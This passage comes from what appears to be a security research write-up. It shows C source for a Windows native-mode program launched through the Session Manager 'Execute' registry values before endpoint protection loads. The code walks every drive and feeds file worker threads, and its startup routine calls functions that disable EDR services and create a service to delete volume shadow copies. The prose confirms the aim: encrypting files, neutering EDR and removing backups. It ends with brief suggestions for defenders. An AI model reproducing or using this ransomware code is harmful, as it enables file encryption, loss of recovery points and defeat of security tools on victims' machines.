            RtlAcquireSRWLockExclusive(&g_FileQueue.Lock);
            BOOLEAN empty = (g_FileQueue.Head == NULL);
            RtlReleaseSRWLockExclusive(&g_FileQueue.Lock);
            if (empty) break;
        }
    }

    return STATUS_SUCCESS;
}


NTSTATUS EnqueueExistingDrives() {
    WCHAR driveRootBuf[16];
    UNICODE_STRING driveRoot;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    NTSTATUS status = STATUS_SUCCESS;

    for (WCHAR letter = L'C'; letter <= L'Z'; letter++) {
        driveRoot.Length = 0;
        driveRoot.MaximumLength = sizeof(driveRootBuf);
        driveRoot.Buffer = driveRootBuf;

        RtlAppendUnicodeToString(&driveRoot, L"\\??\\");
        WCHAR letterStr[3] = { letter, L':', 0 };
        RtlAppendUnicodeToString(&driveRoot, letterStr);
        RtlAppendUnicodeToString(&driveRoot, L"\\");

        InitializeObjectAttributes(&oa, &driveRoot, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hFile;
        NTSTATUS openStatus = NtOpenFile(
            &hFile,
            FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &oa,
            &iosb,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
        );
        if (NT_SUCCESS(openStatus)) {
            NtClose(hFile);

            PQUEUE_ITEM dItem = (PQUEUE_ITEM)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, sizeof(QUEUE_ITEM));
            if (!dItem) {
                status = STATUS_NO_MEMORY;
                break;
            }

            dItem->Path.Buffer = (PWCH)RtlAllocateHeap(g_Heap, HEAP_ZERO_MEMORY, driveRoot.Length + sizeof(WCHAR));
            if (!dItem->Path.Buffer) {
                RtlFreeHeap(g_Heap, 0, dItem);
                status = STATUS_NO_MEMORY;
                break;
            }

            dItem->Path.Length = driveRoot.Length;
            dItem->Path.MaximumLength = driveRoot.Length + sizeof(WCHAR);
            memcpy(dItem->Path.Buffer, driveRoot.Buffer, driveRoot.Length);
            dItem->Path.Buffer[driveRoot.Length / sizeof(WCHAR)] = L'\0';

            InterlockedIncrement(&g_OutstandingDirectories);
            Enqueue(&g_DirectoryQueue, dItem);
        }
    }

    return status;
}

ULONG GetProcessorCount() {
    SYSTEM_BASIC_INFORMATION sbi;
    NTSTATUS status = NtQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), NULL);
    return NT_SUCCESS(status) ? sbi.NumberOfProcessors : 1;
}


extern void NtProcessStartup() {
    g_Heap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);

    InitQueue(&g_DirectoryQueue);
    InitQueue(&g_FileQueue);

    DisableServices();
    CreateVssadminDeleteService();

    ULONG NumProcs = GetProcessorCount();
    ULONG g_DirThreadCount = NumProcs;
    ULONG g_FileThreadCount = NumProcs;

    if (!NT_SUCCESS(EnqueueExistingDrives())) {
        NtTerminateProcess(NtCurrentProcess(), STATUS_UNSUCCESSFUL);
    }

    HANDLE* dirThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_DirThreadCount);
    for (ULONG i = 0; i < g_DirThreadCount; i++) {
        HANDLE hThread;
        RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, DirectoryWorkerThread, NULL, &hThread, NULL);
        dirThreads[i] = hThread;
    }

    HANDLE* fileThreads = (HANDLE*)RtlAllocateHeap(g_Heap, 0, sizeof(HANDLE) * g_FileThreadCount);
    for (ULONG i = 0; i < g_FileThreadCount; i++) {
        HANDLE hThread;
        RtlCreateUserThread(NtCurrentProcess(), NULL, FALSE, 0, 0, 0, FileConsumerThread, NULL, &hThread, NULL);
        fileThreads[i] = hThread;
    }

    NtWaitForMultipleObjects(g_DirThreadCount, dirThreads, WaitAll, FALSE, NULL);
    NtWaitForMultipleObjects(g_FileThreadCount, fileThreads, WaitAll, FALSE, NULL);

    for (ULONG i = 0; i < g_DirThreadCount; i++) {
        NtClose(dirThreads[i]);
    }
    for (ULONG i = 0; i < g_FileThreadCount; i++) {
        NtClose(fileThreads[i]);
    }

    RtlFreeHeap(g_Heap, 0, dirThreads);
    RtlFreeHeap(g_Heap, 0, fileThreads);

    NtTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
}
```

We have seen that native applications registered under the "Execute" family of values under the "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" key allow early execution primitives, namely before EDRs load, providing us with an opportunity to encrypt files and disable EDR services. With the EDR neutered, once the system is fully up and running we can create a service to delete VSS shadow copies (among many other possible ways).

As a final note, it IS possible to prevent tampering of EDR registry keys with Security principals and ACLs that prevent even SYSTEM principals from tampering with them (as well as files and other objects) even without their callbacks registered. This approach prevents breaking the integrity of these EDR, and our post system initialization actions, such as deleting the volume shadow copies. EDRs could additionally prevent BootExecute registry modification or require, as a layer above the operating system, that these files have valid signatures - significantly reducing this ransomware and system manipulation vector.
